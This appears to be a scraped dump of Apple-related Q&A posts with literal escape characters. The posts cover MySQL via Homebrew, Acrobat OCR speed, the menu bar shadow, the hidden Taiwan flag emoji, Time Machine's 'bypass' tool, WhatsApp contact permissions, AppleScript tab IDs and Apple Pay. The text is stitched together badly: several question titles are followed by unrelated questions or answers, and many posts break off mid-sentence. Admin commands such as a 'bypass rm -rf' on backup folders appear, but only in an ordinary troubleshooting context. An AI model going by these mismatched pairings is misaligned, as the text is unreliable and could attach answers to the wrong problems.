I installed MySQL via homebrew, specifically 5.7, and then when I ran \"mysql\" from the command line it errored that the command was not found.\nMy fix was using Homebrew to link the installed MySQL version since 5.7 is not the latest version of MySQL:\nbrew link mysql@5.7 --force\n\nAfter this it recognized \"mysql\" as a command for me. Then running this commands logs me in via the command line:\nmysql -u root\n\nTo start the service I used this command:\nbrew services start mysql@5.7\n\n\nA: Good stuff, looks like we've found the location of the binary and set a path accordingly. It appears as though brew services list wasn't providing completely reliable output re: the actual status of the server.\nThe socket error you're seeing should be due to the fact that the mysql server isn't running.\nThe error seems to be related to the log line:\n2018-06-22T17:56:45.739467Z 0 [ERROR] [FATAL] InnoDB: Table flags are 0 in the data dictionary but the flags in file ./ibdata1 are 0x4800!\nThere's a few possible solutions to this particular error - Server Fault, Github, Github 2\nThe serverfault suggestion looks well written and promising, if it doesn't work you may want to try the github solutions.\n", "Q: Why `find . -iname *.blend` does not find all blend files in external exFAT storage?

Adobe Acrobat is performing Optical Character Recognition on a document with thousands of pages. This is a heavy task which will take hours.\nActivity Monitor tells me that Acrobat is only using one core. Could it not speed up its performance by using two or three cores? My CPU has four cores.\nDoes it simply want to save some resources for other processes? What is the logic behind this limitation?\nAlso, is there any way I could ask Acrobat to use more cores of the CPU, in order to decrease the time taken for this task?\n\n\nA: This is an Adobe issue. Namely, Adobe Acrobat Pro is not multithreaded and therefore cannot take advantage of multi-core CPUs.\nUnfortunately, Adobe has been rather slow in implementing this across most of its software. For example, I refer you to Why is Illustrator throttled to 2% speed when it's in the background? in which Allan provides a great rundown on this (although in relation to Illustrator).\nIn terms of Adobe Acrobat, I refer you to Acrobat and multi core cpu support. Although this is nearly a couple of years old, it is still indicative of the current state of affairs.\nIn summary, there really isn't anything you can do except submit feedback to Adobe about this and hope they implement this soon.\n", "Q: Is my brand new iMac Pro display faulty? There's a dark band beneath the menu bar Today I very excitedly took delivery of my very first Mac, an iMac Pro! It’s all set up and I’m very happy with most of it. But, and it’s a BIG but, I think my display is faulty. Here is a screenshot:\n\nIf you look below the menu bar it appears to have a discoloration for about a half inch of the screen. It’s slightly a darker shade than the surrounding color!\nAt first I thought it could just be the wallpaper, so I changed it to a solid white wallpaper and the discoloration is still there!\n\nIs my beautiful iMac Pro faulty? Can I calibrate the display somehow?\n\nA: No! Your iMac Pro is not faulty! \nI also have an iMac Pro, and below is a screenshot of the same section of the screen. \n\nMy desktop background (i.e. wallpaper) is actually a photo taken by one of this community’s most respected members (so it’s not anything bundled with or generated by macOS) and as you can see the slightly darker shade is also there. This darker shade is actually the menu bar shadow and has been part of Mac OS X since the beginning.\n\nPersonally, I wouldn't worry about the shadow. However, if it worries you enough, you have the following built-in options within macOS:\n\n\n*\n\n*Change your desktop background to an image that camouflages the menu bar shadow (e.g. the bundled Earth and Moon photo)\n\n*Go to Apple > System Preferences > General and tick the Use dark menu bar and Dock option\n\n*Go to Apple > System Preferences > General and tick the Automatically hide and show the menu bar option\n\n*Go to Apple > System Preferences > Accessibility and change your Display Contrast by dragging the slider far enough to hide the menu bar shadow\n\n\nThere are also Terminal commands you can use to disable the shadow effect, however I haven't tested these since probably the Mac OS X El Capitan days, so will test these first before adding them to this answer. \n[UPDATE]\nThis update confirms I have now tested the Terminal commands that could be used in older versions of macOS to remove the shadow effect from the menu bar and windows. Unfortunately, after testing these in macOS High Sierra 10.13.5, I can confirm they no longer work.\nI have also checked the status of older 3rd party apps that used to be able to do this as well, and they do not work in macOS High Sierra either. As a result, the options I provided earlier in my answer appear to be the only workarounds available at this point.\n\nA: On MacOS, various user interface elements are transparent. It's most visible when you scroll for example a browser window, and you can see how the window title bar changes with the contents that's behind it. \nThe same with the menu bar. The desktop picture shines through. It's absolutely 100% intentional, and people like it. As far as I know, Windows does the exact same thing or at least can do the exact same thing. iOS does the same thing. Everyone does it. \nPS. Excellent idea to ask here before dragging your iMac to the Apple Store. \n", "Q: Shortcut to quickly enter .com in browser on Mac OS In Windows, we can use Ctrl+Enter to quickly input .com in browsers.

I just want the menu to stay until I click something in it or click outside of it.\nmacOS Sierra Version 10.12.6 iMac i5\nAny non-Apple mouse\n\nA: This is the default behavior if you hold the right mouse button, not just click it. It's so you can click and hold the right mouse button, move your mouse over the desired entry, and release to select. Make sure you're just clicking and not clicking and holding. It's possible it's a problem with the mouse itself sending the data incorrectly so your computer thinks the button is pressed down longer than it is. \n", "Q: Can't see this emoji  on macOS I just found I can't see this emoji  (Flag of ROC — Republic of China, Taiwan), which is rendered as a cross in a box, on my mac with macOS 10.13.5.\nI bought my Mac in China, but my language regional preferences are all set to the U.S. Is there any way to make this emoji visible again?\nHere is a screen capture of how this is displayed on my computer:\n\n\n\n\nA: My Mac is bought from mainland China. On macOS 11.3 (Big Sur), I can make macOS to show the R.O.C flag with 3 steps:\n\n*\n\n*Modify /Library/Preferences/.GlobalPreferences.plist, set Country to TW (originally CN), as suggested by many existing answers. But it's not sufficient.\nsudo defaults write /Library/Preferences/.GlobalPreferences.plist Country TW\n\n\n\n*Change Language & Region > Region to Taiwan (originally China mainland).\n\n\n*Reboot the machine.\nBased on my tests, the 1st or the 2nd change alone won't succeed. I have to make both changes to show the flag.\n\nA: Probably connected to where you bought the machine.  From Emojipedia:\n\nThe flag for Taiwan, which may show as the letters TW on some platforms.\nThis flag is hidden from the emoji keyboard on iOS devices where the region is set to china. Chinese iPhones won't display this flag and will instead show a missing character tofu (□).\n\n\nA: Try my script: https://gist.github.com/ushuz/4f8c2771b295330b23154acfc00795b3\nIt changes Country field in /Library/Preferences/.GlobalPreferences.plist to TW.  Taiwan flag will be available as long as it's not CN.\nIt works both for 2014 MBP 13'' bought in China and 2018 MBP 13'' bought in HK.\n\nA: The emoji of the flag of R.O.China will not be shown if either of the following is true:\n\n\n*\n\n*The device (Mac or iOS device) is bought from mainland China, determined by hardware serial number\n\n*The \"Region\" setting is set to China\n\n\nThe People's Republic of China doesn't allow the Republic of China flag to be displayed, so the only effective way to show the flag correctly is buying the device from other countries (or Hong Kong).\nEDIT 1\nAfter confirming with Apple Store Genius in mainland China (P.R.C), this is completely depended on the hardware serial number.\nThe confirmed affected products include\n\n\n*\n\n*macOS\n\n*iOS\nIf the hardware serial number is registered in P.R.C (normally all devices purchased from mainland China), the flag won't be shown no matter how you change the Region in Setting.\nHowever, devices purchased from all the other regions, including Hong Kong and Macau, the flag can be rendered if the Region in Setting is not set to China, but the flag will be a tofu if you set to China.\nEDIT 2\nI've contacted a friend live in mainland China, and did an experiment, the result is the same (all depends on hardware S/N), for our safety, some personal information has been covered.\nScreenshots are removed since my friend has some concerns.\nEDIT 3\nA comment is asking about how to tell the country/region of hardware S/N.\nI'm not sure how mac S/N work for this situation cause I couldn't find related information on my MBP (10.13.6 beta), however, there is a common way for iOS products.\nCheck About in Setting -> General, if the ending characters are CH/A in the Model section, then its S/N is highly possible registered in P.R.C.\n\n\n*\n\n*TW (R.O.C) -> TA/A\n\n*USA -> LL/A\nHere is the possible list from wiki \nhttps://www.theiphonewiki.com/wiki/Model_Regions\n\nA: You can solve the problem with the Taiwan emoji for Chinese Mac models with the following command:\ndefaults write /Library/Preferences/.GlobalPreferences.plist Country US\n\n", "Q: How can I get my iPad to automatically connect to my iPhone's hotspot? I have a Wi-Fi iPad. Every time I turn it on, I want it to automatically connect to my phone’s Internet.\nRight now what I have to do is go into settings, then Wi-Fi, then select my phone. Is there a way to automatically have it connect?\n\nA: To get that feature, you need to \"Set up Instant Hotspot\" which is part of Apple's Continuity feature. \nhttps://support.apple.com/en-us/ht204681#hotspot\n\nUse Instant Hotspot with any Mac, iPhone, iPad, or iPod touch that\n  meets the Continuity system requirements. It works when your\n  devices are near each other and set up as follows:\n  \n  \n*\n  \n*Your iPhone or iPad (Wi-Fi + Cellular) has an activated carrier plan    providing Personal Hotspot service.\n  \n*Each device is signed in to iCloud with the same Apple ID.\n  \n*Each device has Bluetooth turned on.\n  \n*Each device has Wi-Fi turned on.\n  \n\n", "Q: iPhone in Lost Mode Can I use same apple id on new phone My iPhone was recently lost, I put it in lost mode via icloud and I know it was found by someone because I got the email from icloud saying it's been found as well as a last known location...but it has since not come online anymore.\nI have a new iPhone now which I want to setup like the old one but I'm still hoping the person who has the old iPhone returns it after realizing it's a paperweight to them without my apple ID(i had text saying reward available if returned).\nMy questions are:\n-What would happen if I setup my new iPhone with the same Apple ID as the old one? Would that remove the old one in lost mode?\n-What if I name the new iPhone with the same name as the old iPhone?\n-I want my old phone number...what happens if I deactivate the old Sim in the lost iPhone, and have my carrier create a new sim for me so I can use in my new iphone? Would that mess up the lost mode?\n\nI basically want to setup my new iphone like my old one but I don't want my old iphone to be taken out of lost mode\n\nA: You can set up your new phone using a previous backup! You’ll need to use your same Apple ID and password, however I highly recommended you change your password once you set up the new phone, just Incase they do get into your old phone they would be able to mess a lot of things up! \n", "Q: Find only podcasts from a single country / language Is there any way to make iTunes (or some command line tool, perhaps) show podcasts only from one particular country / in one particular language?\nOr, to put it differently, to hide all American podcasts, because they are so many and often completely drown content from other countries.\n\nA: On the Mac in iTunes, on the store podcasts page, click on the country flag at the bottom right hand corner, and then select a store for the country you're interested in. You'll then be able to view podcasts for that country, view them in categories, and download them. \n\nA: This Apple page lets you create a JSON/XML \"hot list\" of podcasts (and other content types) for a particular country: https://rss.itunes.apple.com/.\n", "Q: How to shrink (?) iMac's screen?

I was trying to modify the backup directory premissions to allow Read/Write access to all users (with root) and got this output (I had to replace my computer name with asterisks for privacy reasons):\n*****:Time Machine root# chmod -R 0777 Backups.backupdb/\nchmod: Unable to change file mode on Backups.backupdb//.RecoverySets/1/com.apple.recovery.boot/boot.efi: Operation not permitted\nchmod: Unable to change file mode on Backups.backupdb//*****: Operation not permitted\n[...]\n\nHowever, Time Machine can tamper with the files even though root can not.\nI know that in the Get Info dialog is says that the user system can have Read/Write access.\nIs is even possible to have a user be able to access a file when root can not or is is just Apple indicating that the system can access it?\nUPDATE:\nI have been notified that Time Machine backups are a different story altogether with Time Machine Backup Protection.  However, I still don’t know about how System Integrity Protection doesn’t block other things (e.g. Updates from the App Store).\n\nA: Time Machine backup protection isn't related to System Integrity Protection — SIP is for protecting system files. Instead, TMSafetyNet.kext is responsible for enforcing protection of backups and permitting Time Machine to make changes only.\nYou can edit backups using the ‘bypass’ CLI tool.\nsudo /System/Library/Extensions/TMSafetyNet.kext/Contents/MacOS/bypass\n\nAppend the tool you want to use at the end as if you were using it normally, for example:\nsudo …/bypass rm -rf /Volumes/Backups/Backups.backupdb/path/to/folder\n\nThis protection of backups predates the introduction of SIP, but I imagine the file protection feature of SIP was inspired by how the Time Machine backups protection works, so they have their similarities.\n", "Q: How to test my installation script on macOS? What is the best way to test an install script on macOS? \nI have written an installation script so that others can easily install the program qme-ng which I forked and am working on.\nHowever testing the script is very hard. I can manually uninstall all the dependencies, Boost and gmp, each time and see whether my script can properly reinstall them but it is very costly. Furthermore I'm worried about the possibility of dependency removal that isn't complete which can complicate the issue.\n\nA: Your best bet is to create a macOS VM for testing. Install VirtualBox (it's free), create a macOS virtual machine, and then create a snapshot before testing your script. Once you've finished testing your script you can restore the VM to its previous, unmodified state using the snapshot feature.

If you download apps and things, photos will dynamically remove pictures to free up space. It knows it is backed up in iCloud, so it doesn’t worry about keeping your photos saved on device.\nedit: If you absolutely  must have them gone, i'd suggest turning off iCloud photo library for the device in question. go to setting  and tap on your name, click on iCloud, then photos. Turn it off and tap remove from this device. remember you won't get any further photos synced to that device until you turn it back on.\n\nA: I just did this to clean up my iPad where I didn’t want to erase everything, just let iCloud get a fresh download.\n\n\n*\n\n*Turn off iCloud sync for Photos - turning off all options:\n\n\n*\n\n*Turn off Shared albums - choose delete if you get that option.\n\n*Turn off Photo Stream - delete if it’s an option\n\n*Turn off iCloud Photo Library - delete local copies\n\n\n*Use Image Capture app to delete all remaining photos from the iPad.\n\n*(Optional) Sync down a fresh copy from iCloud or establish a USB sync to completely install a new library if you wish. \n\n\nStep 2 wasn’t obvious for me. The reason I wanted to delete wasn’t to start a new library but to get a clean download from iCloud only. I was a little hesitant to delete things for fear it might still delete from iCloud, so I powered off the iPad and then took a couple pictures from my iPhone (or optionally log into https://iCloud.com/photos from a computer and upload a photo or two) to confirm my cloud library was still intact and functioning. Then I powered on the iPad and confirmed it wasn’t getting any new photos from the stream and that if I deleted a couple photos they wouldn’t dissapear online.\nThe next step was to connect the iPad to a Mac and use Image Capture to select all the photos and delete them. In my case I still had over 28,000 photos on the iPad so I couldn’t delete them all in one chunk. About 5,000 per purge seemed to work reasonably fast and clean things up.\nOnce all the photos were gone, I was left with all these empty albums, but deleting them was a real hassle, so I could either sync with an empty library over iTunes or trust if I turned on iCloud again, it would replace my “phantom library” with the correct one.\n\nIf your photos came from a library instead of iCloud before you started, you could also uncheck that sync once iCloud was disengaged.\n\n\n*\n\n*How to delete synced photos from an iPad?\nI’m guessing I had this before iCloud and I actually had a couple libraries commingled which I needed to unravel to let one iCloud library cover all the photos on my iPad.\n", "Q: Windows won't open from Mac Dock I use iTerm a lot and keep the app in the dock.

However, this becomes a bit hard to sustain, so I was wondering whether I could perhaps be \"passively\" contacted on WhatsApp (instead of \"actively\" sending sending own messages) without such requirement. \nSo I have now installed the app, without granting it permission to access my contacts. I was hoping that friends who already use the service and who have my phone number in their list of iOS contacts could now send me messages. However, this does not seem to be the case. Apparently, I do not show up among their \"WhatsApp contacts\".\nSo my question is this: do both parties participating in a WhatsApp chat have to grant their apps access to their (full list of) contacts, or is there a way to participate in a more \"private\" way like I intended?\n\nA: Source for this is the WhatsApp FAQs:\n\nIf you don't allow WhatsApp access to your contacts\nAlthough we strongly recommend allowing WhatsApp access to your phone's contacts, you can continue to use WhatsApp in a limited capacity without allowing access.\nIf you deny WhatsApp access to your phone's contacts, you'll still be able to:\n   - Receive messages from other WhatsApp users and groups\n   - Change WhatsApp settings\nYou won't be able to:\n  - See any contact names and will only see phone numbers\n  - Start new Groups or Broadcast Lists\nHow to enable access to your contacts\nIf you initially denied WhatsApp access to your phone's contacts, you can enable access by going to your phone's settings:\n  \n  \n*\n  \n*Go to Settings > Privacy.\n  \n*Tap Contacts.\n  \n*Make sure WhatsApp is turned on.\n  \n\n\nA: Disclaimer: I have only used the Android app, so this may be incorrect for iOS.\nI was able to be initially messaged by someone, and thus have them perpetually avaiable in the WhatsApp-internal contact list, all without sharing my device contacts. This was done by getting a \"first-class\" user who has already forked over their contacts to message me first.\nThe user who first messages you must allow WhatsApp contact access on their personal device. I know of no way around this, but to be fair, if you're trying to use WhatsApp then you're probably trying to connect with someone who has already done this.\nHere is how I managed it:\n\n\n*\n\n*Install WhatsApp and repeatedly deny any Contacts access.\n\n*Have another party who has already forked over their contacts attempt to contact you on WhatsApp.\n\n*When they are presented a list of their contacts, they should select \"New Contact\" or something of the sort.\n\n*The other party should enter your phone number into this new contact. They should complete this step even if they already have you as a contact on their phone. This step forcibly exposes the phone number to WhatsApp, while it otherwise would not show that you are a WhatsApp user.\n\n*The other party can now message you as normal, add you to groups, etc. You can message back.\n\n*(Optional but recommended) Initially, WhatsApp will continually ask you whether the message you have received is spam. There seems to be no way to do this in the mobile app without actually adding the person to your WhatsApp-visible contacts (and thus forking over your contacts). However, WhatsApp for Desktop or Web makes it really easy to simply mark the conversation as \"not spam\", so for the best experience, sign in to one of those apps to do just that.\n\n\nA: Maybe not the right answer, but it could be useful. Definitely, the best option on iOS is https://apps.apple.com/es/app/dialer-for-whatsapp/id1534997088\nIt’s a free app, without adds and you just dial the number and that is. I find it useful when I want to send a WhatsApp message to someone I don’t have store as a contact, but it could be definitely a good option for your use case.\nI use to send messages to myself too when I want to remember something.\n\nA: [2018-12-10  iOS v2.18.102]\nIf you can get contact with one person, then it is possible to gain access to everyone they know, and thus expand your connection tree through new contacts:\n\n\n*\n\n*Ask the one contact you have, to start a chat which includes other contacts of theirs that you don't have.\n\n*Send a message directly to the group member you want to chat with.  \n\n*(opt) The chat admin can then shut down the group chat, whilst you continue to chat with your new contact person-to-person.\n\n\nYou cannot save the contacts, or attribute names to them, they appear only as phone numbers.\nTo get that first contact, I had whatsapps installed before access to contacts became mandatory.  Which doesn't help you. So some ideas which may:\n\n\n*\n\n*source and install an old version of whatsapp (from a backup or internet archive?), add your one contact(s), then upgrade, denying access to contacts.\n\n*can you install the desktop version of whatsapp and somehow transfer contacts from there?

Cannot restore from a beta backup to a new iDevice.  By erasing all content and settings you also erase the profile that runs the Beta on your iDevice.  Therefore, it will not ask you to upgrade, nor will it allow you to restore because the Beta version is newer than the version that you have.\n\nA: Not sure if this can help, but you could try to use your Apple ID to Login to your iCloud data base, of cause, not all the data you could restore but some of the information such as the contact, message, or if you do have iCloud photo, then sure you will have those photos back after you sign in your Apple ID, and download all the apps you need for daily need.\nbut the first thing first, if you have your data on iCloud\n", "Q: Does copying a migrated iPhotos library use extra space, given that iPhotos and Photos Libraries are hardlinked? If I have migrated an iPhoto Library to Photos (on an external disk, so independent of the computer with the apps), and then make a copy of the iPhotos Library, will I be using additional disk space?\nI understand (now, but not when I did this) that the iPhoto Library and the Photos Library in effect share space because the photos referenced as being \"in\" both are hard linked to the same location (see Does migrating to Apple's new Photos app actually double my storage requirements? and  If I've migrated from iPhoto to Photos, can I safely delete the migrated photo library?). If I make a copy of the iPhoto Library, does that make a copy of the hard links in the iPhoto Library or does it make a copy of the underlying photos as well? The copy is on the same volume, but may or may not be in the same folder (i.e. both alternatives apply).\nIf copying does copy the underlying photos, is there any way of telling which libraries are now sharing linked photos?\n(The problem arose because I had migrated an iPhoto Library to Photos under Yosemite. I then opened the Photos Library under High Sierra, which migrated it to the new HS Photos format (something I had not anticipated), without also creating a pre-migration (Yosemite) version. The problem is that I want to use this Library on an older computer under Yosemite/El Capitan.

Is there any way to avoid this?\nI'm not a fan of cavalier installation of apps (which is why I moved to iPhone from Android), so a native setting is preferred over having to install an app.  I am using iPhone SE.\nEven if there was a way to just change the color of the hyperlink from yellow to a colour that is actually visible on white background, that would help.\nOne answer to this question (below) suggested increasing the font size to compensate for the relative invisibility of yellow text.  It's certainly not ideal, but it seems that I can't even experiment with that.  The Notes app on my iPhone SE doesn't have the formatting buttons found on an iPad (see image below). The respondent's iPhone, also running iOS 11.4, does have formatting buttons. If anyone with an iPhone SE specifically can confirm whether they have formatting buttons, that may corroborate the speculation that the formatting buttons are absent for the iPhone SE specifically, due to its thin width.  \n\n\nA: One option on your iPad is after to type in your number tap the Aa button on the left side over the keyboard. This won't allow you to change the font color but you can change the font size by selecting Title and make it bold. This increases the visibility by a lot on my iPad.

I upgraded the RAM to 64GB(4X16) and it doesn't seem to be much faster while processing FCPX files. Are there any settings I can check to ensure it's running at top speed?\n\nA: Processing files requires CPU/GPU power. More ram helps by caching the files in memory, but your bottleneck probably is the CPU (or maybe a slow storage, if you're using external disk).\nAlso upgrading to the latest macOS version could help, since FCP X is using Metal, and Metal 2 is incorporated in High Sierra.\n\nA: You can open Activity Monitor in the utilities folder and check if the extra RAM is being utilised.\n", "Q: iOS podcast app without fixed episode limits?

Specifically, you're asking about the id property of the tab.  You have to be mindful here: there are two ways of referencing Chrome tabs and windows using numbers:\nReferencing Tabs/Windows by id/index\n\n❶・By index: e.g. tab 2 of window 1\n\nThis refers to the ordered position of the tab from leftmost to rightmost, i.e. tab 1 refers to the left tab, tab 2 refers to tab to the right of tab 1, etc..\nThese indices change if tabs move, open and close.  For example, if you close the middle of three tabs, tab 3 then becomes tab 2.\nWith the windows collection, the index is the ordered position of the window from frontmost to rearmost, ordered by which window most recently received focus.  window 1 is synonymous with the front window, and currently has focus.  When you switch to a different Chrome window, this now becomes window 1, and the previous window 1 is now window 2.\nTherefore, referencing an object and storing references to that object by its index property is a very unreliable method, with the exception of references to the front window or front tab where it only matters that the object currently has focus, regardless of which one it is.  Therefore, tell the front tab of the front window to... is perfectly reasonable use of the index, and probably the only one.\nNote, that the index property is a named property for window objects, which can be read and set (set it to 1 to bring it to the front).  Although tab objects do get referred to by an index property, it is not a named property that one can read or set.\n\n❷・By id: e.g. tab id 54 of window id 53\n\nThis is a unique, fixed property assigned to each object at the moment of its creation, and it typically ascends in value as each new object in a family of similar objects is created.  So, generally speaking, window id 2088 was created after window id 25.\nImportantly, the id provides a fixed reference value with which you can reliably and safely store objects in variables for later use, knowing that they will still refer to the exact same object regardless of where in your script the variable is evaluated and how the arrangement of objects has changed (until the object is destroyed).\nSetting and Getting The Variable\nWhen you wish to assign a reference to a tab or a window to a variable, you can choose to:\neither store its actual id property value, then reference the tab by its id later on, the value of which will be the value of the variable;\nor you can store the entire object itself in an AppleScript variable.  This is often the easiest.\nBy id\nTo store by id, you can do so like this:\n    set T to the id of the active tab of the front window\n\nIn Chrome, the active tab of the front window might return tab id 34 of window id 2045.  The id of that tab object is 34, so T gets assigned the value 34.\nThen, later, to perform actions on that same tab, which may no longer be the active tab, you can do so like this:\n    tell tab id T of the front window to execute JavaScript...\n\n(assuming the front window is still window id 2045; otherwise, you'll have to store the window id value in a separate value too.)\nNote that the reference is to a tab id T and not tab T, which would be tab 34 (i.e. index 34, if you had 34 tabs open).  The id label must be included.\nBy Object\nTo store the tab object itself, which is often preferable, you do so like this:\n    set T to the front tab of the front window\n\nAlthough I've implicitly used index values here, AppleScript actually references the tab and the window both by their id values (which it does so in almost all situations).  So if you evaluate T, you'll find it contains tab id 34 of window id 2045 and not tab 1 of window 1.\nYou can also assign the tab object to a variable like this:\n    set T to the first tab of window id 2045 whose URL is \"chrome://newtab/\"\n\nand T will contain tab id 30 of window id 2045, which you can later call on to perform actions within/upon:\n    set the URL of T to \"https://stackexchange.com\"\n\nor\n    tell T to close\n\n\nA: Notes on the script\nI'm submitting this second \"answer\" to address some specifics about the code sample you provided in your post.  As this doesn't answer your question directly (which my first answer does), and because my first answer is already very long; I felt it sensible to compose this separately.\nTo start, your on setActiveTabIndex(t, searchString) handler definition specifies an argument t, but then makes not use of the variable anywhere in the handler.  The variable t that is utilised actually comes from the repeat with t in tabs of front window loop, where t is sequentially assigned the reference to each tab of the front window.  Therefore, you can simply change the handler declaration to on setActiveTabIndex(searchString), and then adjust the rest of the script accordingly wherever the handler is called, i.e. by removing the first argument.\nOne oddity in the way you implemented the repeat loop in this handler is how you declared a new variable i to serve as a counter, then manually increment its value with each iteration.  Instead, you can define i within the repeat construct itself, like this:\n    repeat with i from 1 to the number of tabs in the front window\n        set t to tab i of the front window\n        if title of t contains the searchString then\n            set the active tab index of the front window to i\n            return\n        end if\n    end repeat\n\nThe rest of the script is okay, but it relies on a lot of manual iterative loops that are not only difficult to read within the script—making it hard to discern what's happening at each stage—but it is also less efficient in execution.\nInstead, you could utilise AppleScript's object collections that can be filtered using whose (or where).\nFor instance, instead of:\n    repeat with win in win_List\n        ...\n        repeat with T in tab_list\n            if searchString is in (title of T as string) then\n                ...\n            end if\n            ...\n        end repeat\n    end repeat\n\nyou can use this:\n    get every tab in every window whose title contains the searchString\n\n", "Q: Apple Pay: is card holder name stored on Apple servers? For Apple Pay, is the card holder name of a debit card stored on Apple servers?\n\nAfter you authenticate your transaction, the Secure Element provides\n  your Device Account Number and a transaction-specific dynamic security\n  code to the store’s point of sale terminal along with additional\n  information needed to complete the transaction. Again, neither Apple\n  nor your device sends your actual payment card number.\n\nhttps://support.apple.com/en-us/ht203027\nWhat is the additional information referred to here?\n\nA: The cardholder name is not stored on Apple's servers when using Apple Pay.\nApple Pay works according to the \"EMV Payment Tokenisation Specification\", which you can download from here:\nhttps://www.emvco.com/emv-technologies/payment-tokenisation/\nThe document is technical in nature, but describes exactly how the system works.\nIn simpler terms the system works like this: When you add a credit card to Apple Pay, your device generates a set of cryptographic keys - one public and one private. The private key is kept only in the secure element of your device. The public key along with your credit card number (the so called \"PAN\") is sent to Apple.\nApple needs the credit card number in order to determine whom to forward the information to - i.e. VISA, MasterCard, etc. The card number and public key is then forwarded to for example VISA, and they will send back an encrypted response to Apple. The encrypted response uses the public key generated on your device so that it is not readable by Apple.\nAt this point Apple discards your credit card number (it is not stored) and forwards the encrypted response to the device. The device is able to decrypt and read the response.\nThe response primarily contains a new credit card number generated for you. The credit card number looks like an ordinary credit card number, but it is both different from your real credit card number, and it is not usable for ordinary transactions. It can only be used as part of an Apple Pay transaction, where the cryptographic keys provide the additional security. This is the method used to ensure that the merchant doesn't see your actual credit card number.\nAs you can see in the specification, the cardholder's name is not transferred in the process. It is not sent by your device, and as the response from for example VISA is encrypted and unreadably by Apple, even should it have contained the name  (which it doesn't) - it isn't readable by Apple.\nYou can see in the specification which types of additional information it is possible to send.\nHowever, there are a few minor details to the above general answer:\n1) Your Apple Pay is linked with your Apple-ID. This means that Apple has access to the name registered to the Apple ID - if this is identifical to the cardholder's name, which it would be in most cases, Apple defacto knows the name.\n2) In the case of Apple Pay Cash, Apple reserves the right to request and store your name on their servers. As described here:\nhttps://support.apple.com/da-dk/HT203027\n3) There is a (very low) risk that Apple isn't actually following the standards, and actually your credit card number is not discarded or they somehow in an illegal way gets access to your cardholder's name. This would be illegal and it would be breaking agreements with payment processors. Also payment processors have certification processes in place to ensure that the involved parties adhere to the standard. In short, if this would be the case, it would be a huge scandal ruining Apple's reputation in the payment industry and elsewhere. I think it is extremely unlikely.\n\nA: You have asked 2 different questions:\n\n\n*\n\n*Is the cardholder name of a debit card stored on Apple servers?\n\n*What is the additional information Apple sends to complete the transaction?\n\n\nI'll post the answer to the first question while I research the second question.  Alternately, if someone else knows the answer to the second question, please feel free to edit this answer to add it.\n1A. According to this Apple page (emphases added):\n\nApple Pay is safer than using a plastic credit, debit, or prepaid card. Every transaction on your iPhone, iPad, or Mac requires you to authenticate with Face ID, Touch ID, or your passcode. Your Apple Watch is protected by the passcode that only you know, and your passcode is required every time you put on your Apple Watch or when you pay using Apple Pay. Your card number and identity aren’t shared with the merchant, and your actual card numbers aren’t stored on your device or on Apple servers. \n\n", "Q: Does IFTTT app drain battery faster in iPhone (and Apple Watch)? The IFTTT app sounds interesting with endless possibilities. I have just installed it but skeptical about using it because of the possibility of battery drain. The app has to keep track of every event of the app you associate it with. \nSo, does the IFTTT app have a noticeable affect in battery consumption or just like any other 'average' background activity? \n\nA: I use IFTTT on my iPhone X iOS 11.4.  \nWhen I check Settings -> Battery and look at the last 7 days, IFTTT doesn't even show-up on the list of applications.  That means it's using less than 1% of my battery.  \nMy recommendation to you, if you're thinking of using IFTTT, is to try it with a handful of recipes for a few weeks.  Then check the battery usage and see the impact on battery life.\nNow, I'm sure this will change depending on how many recipes you're using and what kind of recipes they are.  IFTTT is just woken-up by iOS at periodic intervals to check for system notifications that something happened.  \n", "Q: How to set Firefox as default client for ftp:// links? How can I set Firefox as the default client for ftp:// links? At the moment default client for ftp:// is Finder, which I don't like.\nI found a similar question, which is 7 years old and the solutions don't work anymore.\n\nA: There's a free application called RCDefault App that allows you to set the default application for different protocols, file handlers, etc.\nFor example, for FTP, I can set whatever application I choose to handle that protocol...\n\nInstallation is extremly easy.  Once you download and open the DMG, simply copy the file to either /Library/PreferencePanes or ~/Library/PreferencePanes (if you only want it accessible to your user profile)\nAfter it's copied, open the application up from System Preferences and you can start customizing.\n\nIt hasn't been updated in a long time, but I just verified that it works on High Sierra.  \n", "Q: Watch alarm now seems weak I love the watch for silent alarms.

I realised I couldn't do it from the Disk Utility app, so I opened up the terminal and ran diskutil  eraseVolume  free  n  disk0s5 and the partition was deleted successfully!\nAfter that, I realised that the space the BOOTCAMP partition occupied, wasn't released back to Macintosh HD!

Will it even do what I want?\nThanks in advance!\nPS: I know it's not ubuntu related, but since Macs are unix based, the answer should be the same\n\nA: From this article it looks like what you're doing is a 35-pass secure wipe of the unpartitioned space.\nYou might have better luck resizing the existing Macintosh HD to the full disk capacity. \nIf you try to resize Macintosh HD using disk utility and you encounter an error please update your question with a screenshot of the error, and the output of running diskutil list from a terminal window. Terminal can be found in the utilities folder.\n\nA: You can do it from the Disk Utility app, by selecting \"Partition\" and then proceeding until you see the pie chart. Then select the Bootcamp partition (alternatively named \"Empty space\"), and delete it (pressing the \"Backspace\" key). Then proceeding, so that the original Macintosh HD partition will get resized to the full available space. \nPS: Make sure to read the dialogs and window popups as you don't want to erase any content on Macintosh HD in this process, so proceed with care.\n", "Q: Does Time Machine restore whole system? I've never used Time Machine before and I pretty much know how backups work but I'm wondering if my system will work out of the box once restored from Time Machine backup?\nI mean I have tons of stuff on my Mac and configuring it all once something goes wrong will take me days. I'm talking about my whole programming environment including multiple Docker images, databases, hundreds of npm packages, custom system files (like \"hosts\"), hundreds of Applications with custom settings, some games etc.\nIf I decide to backup EVERYTHING and things go south can I just grab a brand new MacBook, connect my external hard drive with TM backup and it will import EVERYTHING meaning it will work just like my system before crash? \nBTW I'm using a standard external HDD.\n\nA: No, time machine has several sorts of exclusions so it does not even back up everything, let alone restore everything. The good news, everything that gets backed up will restore to the same or newer OS. \n\n\n*\n\n*On OS X, what files are excluded by rule from a Time Machine backup?\nYou could review those and be safe knowing you’re set. \nOr you could review each time you place things and verify you can restore them (or inspect they are not excluded). \n tmutil isexcluded /path/to/file\n\nI would say you should probably have a clone backup to save your bacon and start with SuperDuper and Carbon Copy Cloner and not mess with disk utility (which can clone a drive) unless you really can’t make one of the purpose built tools to work for your budget and needs. Doing one bootable backup a month and any time you make major changes means you have two different backups and don’t need to update your clone every night (unless you really like that sort of thing). \nRead up on either web site for the many potential benefits of a bootable backup, not the least being all files get copied. \n\n\n*\n\n*https://shirt-pocket.com/SuperDuper/SuperDuperDescription.html\n\n*https://bombich.com/\n\nA: In geneal, yes, everything that is important to most users is included in a Time Machine backup. As stated in other answers, there are a number of restrictions regarding OS bootability and excluded system files and the likes, and there are certain computer-bound features like software activation of for example Adobe software that doesn’t transfer with a backup.\nIn most cases, you can simply buy a replacement Mac, connect the 